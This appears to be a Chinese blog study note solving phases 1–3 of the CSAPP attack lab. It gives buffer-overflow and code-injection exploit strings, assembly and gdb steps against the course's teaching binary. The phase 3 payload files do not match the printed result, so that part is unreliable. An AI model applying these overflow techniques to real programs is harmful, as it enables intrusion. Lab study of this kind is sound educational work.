CSAPP Note chap3 attacklab

CSAPP  读书笔记系列chap3 attacklab

### attacklab

需要注意的是这个lab可能会遇到shark machine(也就是ＭＴＵ的远程机)，下面具体遇到再说http://ysite.me/no-shark/

这篇教程说到的前两个phase不搞也行

LET US START,
教程更加具体的可以看这篇http://wdxtub.com/2016/04/16/thick-csapp-lab-3/
,这个菊苣是ＭＴＵ的ＴＡ，他的环境是MTＵ的内网，我们ｓｅｌｆｓｔｕｄｙ的有一些不同；自己动手做一下

用到的文件
- ctarget: 用来做代码注入攻击的程序
- rtarget: 用来做 ROP 攻击的程序
- cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符
- farm.c: 用来找寻 gadget 的源文件
- hex2raw: 用来生成攻击字符串的程序


#### phase_1
- objdump -d ctarget > ctarget.txt

得到的文件为
```

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp  ＃缓冲区为０x28，即40大小字节
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```
然后把00000000　004017c0的　后八位 0x004017c0为栈顶的地址，注意是小端模式；

新建一个文件p1.txt，内容为：

前四十位是啥都不重要，后面四位按照 little endian 的规则逆向填上地址就好（注意这里为了排版用了换行，实际上都应该在一行，用空格分开），这样就改写了属于原来的返回地址。
```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
c0 17 40 00
```
然后执行
```
./hex2raw < p1.txt > p1r.txt
```
把这个字符文件转换成字节码

然后执行
```
./ctarget -qi p1r.txt
```
** 注意需要加q,不用远程评分，因为我们的ｈｏｓｔ不对**

否则为：
```
FAILED: Initialization error: Running on an illegal host [ferris]
```
然后就可以看到结果：

```
./ctarget -qi p1r.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:

        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```
#### phase_2

第二关中需要插入一小段代码，ctarget 中的 touch2 函数的 C 语言如下：
```
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```
也需要把自己的 cookie 作为参数传进去，这里需要把参数放到 %rdi 中，只使用 ret 来进行跳转。

按照教程，先建立 p2.s汇编文件　：
```
mov $0x59b997fa, %rdi # set my cookie as the first parameter
pushq $0x4017ec
ret
```
然后转为机器码
```
gcc -c p2.s
objdump -d p2.o > p2.byte
```
得到文件为：
```
2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   

```
然后　

gdb ctarget 开始调试，因为我想知道缓冲区从哪里开始，所以在 getbuf 中看看 %rsp 的值即可
** 注意每次在ｇｄｂ里面运行也需要加 -q表示本地　**

然后下一步因为是外网所以有点不同；具体为

```

(gdb) ctarget

(gdb) b *(getbuf+12)  #注意为１２，得到断点
(gdb) run -q   ＃本地
Starting program

(gdb) p/x $rsp

```
具体为：
```
(gdb) b *(getbuf+12)
Breakpoint 4 at 0x4017b4: file buf.c, line 16.
(gdb) c
Continuing.
Type string:fdafdsadf

Breakpoint 4, getbuf () at buf.c:16
16      in buf.c
(gdb) info registers
rax            0x5561dc78       1432476792
rbx            0x55586000       1431855104
rcx            0x19     25
rdx            0x7ffff7dd3790   140737351858064
rsi            0xa      10
rdi            0x7ffff7dd18e0   140737351850208
rbp            0x55685fe8       0x55685fe8
rsp            0x5561dc78       0x5561dc78   #rsp的地址
```
得到地址为　０x5561dc78

然后编写p2.txt文件：
```
48 c7 c7 fa
97 b9 59 68
ec 17 40 00
c3 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
78 dc 61 55  
```
然后
```
./hex2raw < p2.txt > p2r.txt
➜  target1-ATTACK ./ctarget -qi p2r.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```
phase_2 到这里也搞定

#### phase_3

按照别人的做法，得到的
p3.s
```
movq $0x59b997fa,%rdi   # mov the cookie string address to parameter
pushq $0x004018fa   #push touch3 address
retq
```
cookie的ａｓｃｉｉ为:
```
0x59b997fa
对应ascii码为35 39 62 39 39 37 66 61

```
然后得到的p3.txt为：
```
48 c7 c7 fa 97 b9 59 68 fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61 78 dc 61 55 00 00 00 00
09 00 00 00 00 00 00 00 94 1f 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```
然后：
```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

暂时做到这里
